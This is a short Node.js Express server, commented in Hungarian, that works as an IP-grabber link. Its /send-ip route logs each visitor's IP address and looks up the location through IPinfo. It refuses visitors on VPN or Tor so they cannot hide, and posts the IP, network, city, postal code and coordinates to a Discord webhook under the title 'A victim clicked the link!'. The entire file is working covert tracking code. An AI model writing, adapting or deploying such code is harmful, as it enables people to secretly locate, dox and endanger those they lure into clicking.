const express = require('express');
const axios = require('axios');
require('dotenv').config();
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

// Statikus fájlok kiszolgálása (CSS, JS, stb.)
app.use(express.static(path.join(__dirname, 'public')));

// Webhook URL és IPINFO token a .env fájlból
const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
const ipinfoToken = process.env.IPINFO_TOKEN;

// VPN blokkolás - VPN IP tartományok listája (bővíthető)
const blockedVPNs = [
    'VPN', 'Private Network', 'Proxy', 'Tor', 'VPN Provider', 'PrivateVPN', 'NordVPN', 'HideMyAss', 'ExpressVPN'
];

// Az alapértelmezett útvonal (/) kiszolgálja az index.html-t
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));  // Az index.html fájl kiszolgálása
});

// /send-ip útvonal
app.get('/send-ip', async (req, res) => {
    const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();

    try {
        // IP geolokáció lekérése az IPInfo API-val
        const geoResponse = await axios.get(`https://ipinfo.io/${userIp}?token=${ipinfoToken}`);
        const geoData = geoResponse.data;

        console.log("GeoData:", geoData);  // Logoljuk a válaszként kapott adatokat

        // Ellenőrizzük, hogy VPN használatával érkezett-e
        const isVPN = blockedVPNs.some(keyword => geoData.org && geoData.org.toLowerCase().includes(keyword.toLowerCase()));

        if (isVPN) {
            return res.status(403).send('VPN észlelve, hozzáférés blokkolva!');
        }

        // Az API válaszból kiolvassuk a szükséges adatokat
        const [latitude, longitude] = (geoData.loc || '0,0').split(',');

        // A webhook üzenet elkészítése
        const message = {
            username: "Helyszíni Naplózó <3",
            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
            content: `<@1095731086513930260>`,
            embeds: [{
                title: "Egy áldozat rákattintott a linkre!",
                description: `**IP-cím >>** ${userIp}\n**Hálózat >>** ${geoData.org || 'N/A'}\n**Város >>** ${geoData.city || 'N/A'}\n**Régió >>** ${geoData.region || 'N/A'}\n**Ország >>** ${geoData.country || 'N/A'}\n**Irányítószám >>** ${geoData.postal || 'N/A'}\n**Szélesség >>** ${latitude}\n**Hosszúság >>** ${longitude}`,
                color: 0x800080
            }]
        };

        // Webhook üzenet küldése
        await axios.post(webhookUrl, message); // Alapértelmezett webhook URL küldése
        res.json({ ip: userIp }); // Visszaadja az IP-t JSON formátumban
    } catch (error) {
        console.error('Hiba:', error.message);
        res.send('Nem sikerült az IP lekérdezés vagy Discord küldés.');
    }
});

// Szerver indítása
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
